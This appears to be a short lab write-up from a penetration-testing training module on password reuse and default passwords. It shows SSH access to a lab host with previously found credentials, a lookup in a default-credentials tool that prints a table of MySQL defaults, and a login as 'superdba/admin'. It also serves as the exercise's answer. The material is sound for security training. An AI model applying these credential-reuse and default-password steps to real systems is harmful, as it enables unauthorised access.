# Password Reuse / Default Passwords

### Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer.&#x20;

```bash
#creds sam:B@tm@n2022!
ssh sam@10.129.146.4
#installing default creddbs
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
pip3 install defaultcreds-cheat-sheet
./creds search mysql
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql (ssh)         |        root       |   root   |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
mysql -u superdba -padmin
```
